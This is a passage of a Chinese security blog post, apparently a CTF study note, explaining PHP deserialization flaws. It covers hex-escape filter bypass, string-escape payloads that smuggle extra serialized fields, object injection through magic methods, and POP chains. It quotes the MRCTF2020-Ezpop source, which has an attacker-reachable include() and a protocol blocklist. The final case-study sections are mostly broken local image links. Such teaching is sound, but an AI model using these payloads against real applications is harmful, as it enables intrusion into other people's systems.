class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-comment">// 做处理后 \75是u的16进制 </span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>; <br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><h4 id="情况1：过滤后字符变多"><a href="#情况1：过滤后字符变多" class="headerlink" title="情况1：过滤后字符变多"></a>情况1：过滤后字符变多</h4><p>首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;I am 11&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$age</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;反序列化字符串：&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;过滤后:&quot;</span>;<br><span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;此时，age=<span class="hljs-subst">$new</span>[1]&quot;</span>;<br></code></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code></p><p><img src="https://img-blog.csdnimg.cn/20210203104830625.png#pic_center" alt="在这里插入图片描述"> </p><p>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><p><img src="https://img-blog.csdnimg.cn/20210203104840221.png#pic_center" alt="在这里插入图片描述"> </p><p>首先来看看结果，再来讲解</p><p><img src="https://img-blog.csdnimg.cn/20210203104847637.png#pic_center" alt="在这里插入图片描述"> </p><p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code><br><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符<br>由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code><br>最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程</p><h4 id="情况2：过滤后字符变少"><a href="#情况2：过滤后字符变少" class="headerlink" title="情况2：过滤后字符变少"></a>情况2：过滤后字符变少</h4><p>老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;age&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;反序列化字符串：&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;过滤后:&quot;</span>;<br><span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;此时，age=&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br></code></pre></td></tr></table></figure><p>正常情况传入<code>name=mao&amp;age=11</code>的结果</p><p><img src="https://img-blog.csdnimg.cn/20210203104859195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>老规矩看看最后构造的结果，再继续讲解</p><p><img src="https://img-blog.csdnimg.cn/20210203104905443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是age序列化后的结果</p><p><code>s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;&quot;</code></p><p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p><h2 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h2><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、<code>unserialize</code>的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//比如这个例子</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;y4mao&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>在脚本运行结束后便会调用<code>_destruct</code>函数，同时会覆盖test变量输出<code>maomi</code></p><h2 id="POP链的构造利用"><a href="#POP链的构造利用" class="headerlink" title="POP链的构造利用"></a>POP链的构造利用</h2><h3 id="POP链简单介绍"><a href="#POP链简单介绍" class="headerlink" title="POP链简单介绍"></a>POP链简单介绍</h3><p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p><h3 id="简单案例讲解"><a href="#简单案例讲解" class="headerlink" title="简单案例讲解"></a>简单案例讲解</h3><p>首先看看简单的MRCTF2020-Ezpop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="使用详情"><a href="#使用详情" class="headerlink" title="使用详情"></a>使用详情</h2><h3 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202237488.png" alt="image-20220324202237488"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202314464.png" alt="image-20220324202314464"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202351819.png" alt="image-20220324202351819"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202510705.png" alt="image-20220324202510705"> </p><h3 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202655131.png" alt="image-20220324202655131"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202741131.png" alt="image-20220324202741131"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202803652.png" alt="image-20220324202803652"> </p><p>找一个可控变量</p><h3 id="一个实战实例"><a href="#一个实战实例" class="headerlink" title="一个实战实例"></a>一个实战实例</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203543379.png" alt="image-20220324203543379"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203616257.png" alt="image-20220324203616257"> </p><p>看到有实例化类，那么在实例化类中我们应该寻找试着寻找有没有可控函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204045761.png" alt="image-20220324204045761">  </p><p>发现没有可以触发的危险函数，所以在想可不可以通过它去触发其他带有的危险函数</p><p>又发现他又拼接的过程，所以就考虑红色标注处有没有可能触发_tostring函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204131945.png" alt="image-20220324204131945"> </p><p>遍历代码发现没有可以直接利用的危险函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204420900.png" alt="image-20220324204420900"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204436886.png" alt="image-20220324204436886"> </p><p>所以要看这两个参数是否可控，如果不可控就不是可以直接利用的漏洞</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203500092.png" alt="image-20220324203500092"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204637309.png" alt="image-20220324204637309"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204749913.png" alt="image-20220324204749913"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204918681.png" alt="image-20220324204918681"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204941126.png" alt="image-20220324204941126"> </p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324205139956.png" alt="image-20220324205139956" style="zoom:80%;" /><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324205205017.png" alt="image-20220324205205017"> </p><p>通过cookie或者post都可以传入</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324210105508.png" alt="image-20220324210105508"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
